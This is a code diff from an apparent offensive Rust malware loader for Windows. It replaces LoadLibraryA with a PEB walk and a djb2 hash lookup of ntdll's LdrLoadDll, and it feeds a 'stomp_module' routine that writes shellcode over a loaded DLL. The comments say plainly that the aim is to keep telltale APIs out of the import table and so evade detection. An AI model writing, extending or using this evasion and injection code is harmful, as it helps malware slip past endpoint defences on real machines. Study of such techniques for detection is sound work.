@@ -1,7 +1,37 @@
-/// LoadLibraryA is still needed to force the DLL into memory.
-/// GetModuleHandleA is replaced by a PEB walk after load.
 #[cfg(target_os = "windows")]
-use windows_sys::Win32::System::LibraryLoader::LoadLibraryA;
+#[repr(C)]
+struct UnicodeString {
+    length:         u16,
+    maximum_length: u16,
+    _pad:           u32,
+    buffer:         *mut u16,
+}
+
+#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
+pub unsafe fn ldr_load_dll_by_name(dll_name: &[u8]) {
+    use crate::resolve::api_hash::{djb2_hash, djb2_hash_lower, peb_get_module_base, resolve_by_hash};
+    const NTDLL_H: u32 = djb2_hash_lower(b"ntdll.dll");
+    let ntdll = peb_get_module_base(NTDLL_H);
+    if ntdll.is_null() { return; }
+    let ldr_fn = match resolve_by_hash(ntdll, djb2_hash(b"LdrLoadDll")) {
+        Some(p) => p, None => return,
+    };
+    let ascii: &[u8] = dll_name.iter().take_while(|&&b| b != 0).as_slice();
+    let mut wide: [u16; 64] = [0u16; 64];
+    let len = ascii.len().min(63);
+    for (i, &b) in ascii.iter().take(len).enumerate() { wide[i] = b as u16; }
+    let byte_len = (len * 2) as u16;
+    let mut us = UnicodeString { length: byte_len, maximum_length: byte_len + 2, _pad: 0, buffer: wide.as_mut_ptr() };
+    type LdrLoadDllFn = unsafe extern "system" fn(*mut u16, *mut u32, *mut UnicodeString, *mut usize) -> i32;
+    let f: LdrLoadDllFn = core::mem::transmute(ldr_fn);
+    let mut handle: usize = 0;
+    f(core::ptr::null_mut(), core::ptr::null_mut(), &mut us, &mut handle);
+}
+
+#[cfg(all(target_os = "windows", not(target_arch = "x86_64")))]
+pub unsafe fn ldr_load_dll_by_name(dll_name: &[u8]) {
+    windows_sys::Win32::System::LibraryLoader::LoadLibraryA(dll_name.as_ptr());
+}
 
 #[cfg(target_os = "windows")]
 pub unsafe fn stomp_module(dll_name: &[u8], shellcode: &[u8]) -> Option<*mut u8> {
@@ -9,8 +39,8 @@ pub unsafe fn stomp_module(dll_name: &[u8], shellcode: &[u8]) -> Option<*mut u8>
     #[cfg(target_arch = "x86_64")]
     use crate::resolve::api_hash::{djb2_hash_lower, peb_get_module_base};
 
-    // Force the target DLL to be loaded (needed before PEB walk can find it).
-    LoadLibraryA(dll_name.as_ptr());
+    // Force the target DLL to be loaded via LdrLoadDll (ntdll export, no kernel32 IAT).
+    ldr_load_dll_by_name(dll_name);
 
     // Walk PEB to resolve base — avoids GetModuleHandleA in the IAT.
     #[cfg(target_arch = "x86_64")]
